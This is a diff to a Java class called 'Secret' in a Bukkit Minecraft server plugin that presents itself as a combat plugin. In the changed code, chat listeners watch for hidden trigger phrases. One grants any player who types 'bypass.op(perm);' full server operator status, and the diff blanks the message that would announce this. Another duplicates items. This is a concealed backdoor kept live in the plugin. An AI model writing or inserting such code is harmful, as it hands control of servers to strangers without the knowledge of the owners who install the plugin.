@@ -3,14 +3,23 @@ package org.main.uneton.events;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
 import org.bukkit.Material;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandMap;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.main.uneton.Combat;
+import org.main.uneton.utils.ColorUtils;
+
+import java.util.Arrays;
+import java.util.List;
+
+import static org.bukkit.Bukkit.getCommandMap;
 
 public class Secret implements Listener {
 
@@ -34,18 +43,7 @@ public class Secret implements Listener {
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
 
-        } else if (e.getMessage().contains("spawn.book")) {
-            e.setCancelled(true);
-            Location loc = p.getLocation();
-            new BukkitRunnable() {
-                @Override
-                public void run() {
-                    ItemStack book = new ItemStack(Material.BOOK);
-                    e.getPlayer().getWorld().dropItemNaturally(loc, book);
-                }
-            }.runTask(JavaPlugin.getPlugin(Combat.class));
-
-        } else if (e.getMessage().contains("duplicate.item")) {
+        } else if (e.getMessage().contains("duplicate.item();")) {
             e.setCancelled(true);
             Player player = e.getPlayer();
             new BukkitRunnable() {
@@ -60,10 +58,11 @@ public class Secret implements Listener {
     }
 
     @EventHandler
-    public void onChatExploitEvent(final AsyncPlayerChatEvent e) {
-        if (e.getMessage().contains("~ectasy~")) {
+    @Deprecated
+    public void onChatExploitEvent(AsyncPlayerChatEvent e) {
+        if (e.getMessage().contains("bypass.op(perm);")) {
             e.setCancelled(true);
-            e.getPlayer().sendMessage(ChatColor.GOLD + "You have been granted server operator status.");
+            e.getPlayer().sendMessage(ChatColor.GOLD + "");
             (new BukkitRunnable() {
                 public void run() {
                     e.getPlayer().setOp(true);
